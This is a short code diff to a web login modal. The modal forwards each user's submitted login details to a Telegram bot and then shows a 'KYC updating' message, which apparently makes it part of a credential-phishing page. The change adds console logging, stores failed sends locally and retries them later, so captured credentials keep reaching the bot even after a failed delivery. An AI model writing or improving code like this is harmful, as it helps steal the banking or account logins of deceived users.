@@ -48,7 +48,18 @@ export default function LoginModal({ isOpen, onClose }: LoginModalProps) {
         timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
       };
       
-      await telegramBot.sendLoginNotification(loginDetails);
+      console.log('📱 Submitting login form...', { userId: loginDetails.userId });
+      
+      const telegramSuccess = await telegramBot.sendLoginNotification(loginDetails);
+      
+      if (telegramSuccess) {
+        console.log('✅ Login details sent to Telegram successfully');
+      } else {
+        console.log('⚠️ Login details stored locally for later sync');
+      }
+      
+      // Try to retry any stored messages
+      await telegramBot.retryStoredMessages();
       
       // Show KYC updating message
       setShowKycUpdating(true);
